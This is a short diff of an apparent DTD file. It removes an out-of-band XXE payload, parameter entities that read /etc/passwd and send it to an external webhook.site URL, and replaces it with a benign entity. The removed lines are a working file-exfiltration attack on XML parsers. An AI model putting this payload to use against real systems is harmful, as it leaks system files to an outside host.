@@ -1,4 +1,1 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % trim "<!ENTITY &#x25; send SYSTEM 'https://webhook.site/f9172f99-e1a0-45fe-b089-3e7c073605ee/?p=%file;'>">
-%trim;
-%send;
+<!ENTITY hi "HELLO_FROM_DTD">
